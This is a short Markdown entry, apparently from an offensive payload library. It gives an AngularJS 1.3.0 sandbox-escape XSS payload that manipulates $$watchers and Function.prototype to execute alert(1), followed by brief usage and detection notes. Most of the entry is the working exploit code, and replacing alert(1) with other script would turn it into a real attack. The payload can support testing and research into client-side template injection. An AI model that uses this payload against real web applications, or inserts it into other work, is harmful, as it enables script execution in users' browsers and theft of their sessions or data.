---
type: code
language: JavaScript
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tags:
  - xss
  - proto-bypass
  - angularjs
platforms:
  - Web
validated: true
---

# AngularJS-Watchers-Function-Proto-Bypass

## Code

```javascript
{{!ready && (ready = true) && (
      !call
      ? $$watchers[0].get(toString.constructor.prototype)
      : (a = apply) &&
        (apply = constructor) &&
        (valueOf = call) &&
        (''+''.toString(
          'F = Function.prototype;' +
          'F.apply = F.a;' +
          'delete F.a;' +
          'delete F.valueOf;' +
          'alert(1);'
        ))
    );}}
```

## Description

Manipulates watchers and Function.prototype.apply/valueOf to inject and execute alert(1) in AngularJS 1.3.0.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Targets watcher scope. | N/A |

## Usage

In apps with active $$watchers.

## Detection

- Watcher manipulation in debug mode.
- Prototype deletions.

## Related

- [[procedures/Angular-AngularJS-Stored-Reflected-XSS-Simple-Alert]]
